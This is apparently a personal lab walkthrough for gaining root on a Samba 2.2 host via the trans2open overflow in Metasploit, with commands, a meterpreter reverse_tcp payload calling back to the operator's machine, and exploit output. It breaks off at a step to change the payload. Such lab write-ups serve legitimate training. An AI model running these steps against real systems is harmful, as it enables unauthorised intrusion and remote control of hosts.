

# Gaining Root with Metasploit

### Attack the SMB

Recap:
	1. We did searchsploit samba 2.2 and found trans2open vulnerability

```
──(kali㉿kali)-[~]
└─$ searchsploit samba 2.2 | grep trans2open
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                                                                     | osx/remote/9924.rb
Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                | bsd_x86/remote/16880.rb
Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                                              | linux_x86/remote/16861.rb

```

Now lets try the metasploit (msfconsole) the trans2open

1. Execute `search trans2open`

```
msf6 > search trans2open

Matching Modules
================

   #  Name                              Disclosure Date  Rank   Check  Description
   -  ----                              ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)


Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open


```


2. Use the Option 1 (Linux Machine)

```
msf6 > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/samba/trans2open) > 

```

3. Set RHOSTS (the target)

```
msf6 exploit(linux/samba/trans2open) > set RHOSTS 192.168.68.6
RHOSTS => 192.168.68.6

```

4. Check the settings using `options` command

```
msf6 exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.68.6     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.68.8     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce

```

5. Run either `exploit` or `run`

6. If the session is closed or died. Check the payload option. As you see in the result of `options` command. The payload set is a staged `linux/x86/meterpreter/reverse_tcp`. Lets use the non staged if it will work (`linux/x86/meterpreter_reverse_tcp')

```
msf6 exploit(linux/samba/trans2open) > exploit

[*] Started reverse TCP handler on 192.168.68.8:4444 
[*] 192.168.68.6:139 - Trying return address 0xbffffdfc...
[*] 192.168.68.6:139 - Trying return address 0xbffffcfc...
[*] 192.168.68.6:139 - Trying return address 0xbffffbfc...
[*] 192.168.68.6:139 - Trying return address 0xbffffafc...
[*] Sending stage (1017704 bytes) to 192.168.68.6
[*] 192.168.68.6 - Meterpreter session 1 closed.  Reason: Died
^[[B^[[B^[[B[*] 192.168.68.6:139 - Trying return address 0xbffff9fc...
[*] Sending stage (1017704 bytes) to 192.168.68.6
[*] 192.168.68.6 - Meterpreter session 2 closed.  Reason: Died

```

7. Set the payload
